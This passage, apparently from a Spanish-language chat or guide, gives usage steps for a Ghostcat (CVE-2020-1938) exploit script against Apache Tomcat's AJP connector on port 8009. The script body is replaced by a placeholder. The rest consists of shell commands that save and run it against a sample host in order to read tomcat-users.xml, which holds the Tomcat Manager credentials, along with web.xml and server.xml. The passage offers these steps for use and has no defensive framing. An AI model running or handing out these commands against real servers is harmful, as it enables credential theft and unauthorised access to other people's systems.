Ghostcat - CVE-2020-1938 Exploit
Lee archivos del Tomcat via AJP connector (puerto 8009)
Uso: python3 ghostcat.py <host> [archivo]
"""

# Guardar el script
cat > ghostcat.py << 'PYEOF'
[AQUÍ VA EL CÓDIGO COMPLETO DE ARRIBA]
PYEOF

# Dar permisos y ejecutar
chmod +x ghostcat.py

# Leer tomcat-users.xml (credenciales del Tomcat Manager)
python3 ghostcat.py ejemplo.com conf/tomcat-users.xml 8009

# Leer WEB-INF/web.xml
python3 ghostcat.py ejemplo.com WEB-INF/web.xml 8009

# Leer server.xml (configuración completa)
python3 ghostcat.py ejemplo.com conf/server.xml 8009


